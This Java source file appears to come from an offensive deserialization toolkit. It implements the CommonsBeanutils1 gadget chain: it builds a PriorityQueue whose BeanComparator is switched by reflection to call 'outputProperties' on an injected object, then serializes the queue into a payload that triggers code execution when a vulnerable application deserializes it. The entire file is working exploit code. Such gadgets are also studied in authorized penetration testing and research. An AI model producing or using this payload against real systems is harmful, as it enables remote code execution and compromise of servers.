package com.droplab.Utils.UnSerialize.Gadget;

import com.droplab.Utils.UnSerialize.Gadget.Interface.GadgetInterface;
import com.droplab.Utils.UnSerialize.utils.Gadgets;
import com.droplab.Utils.UnSerialize.utils.Reflections;
import org.apache.commons.beanutils.BeanComparator;

import java.math.BigInteger;
import java.util.PriorityQueue;

public class CommonBeanutils1 implements GadgetInterface {

    @Override
    public byte[] getObject(final Object o) {
        try {

            final BeanComparator comparator = new BeanComparator("lowestSetBit");

            // create queue with numbers and basic comparator
            final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
            // stub data for replacement later
            queue.add(new BigInteger("1"));
            queue.add(new BigInteger("1"));

            // switch method called by comparator
            Reflections.setFieldValue(comparator, "property", "outputProperties");

            // switch contents of queue
            final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
            queueArray[0] = o;
            queueArray[1] = o;

            byte[] bytes = Gadgets.SerializeObject(queue);
            return bytes;
            //return queue;
        }catch (Exception e){
            e.printStackTrace();
        }

        return new byte[0];
    }
}
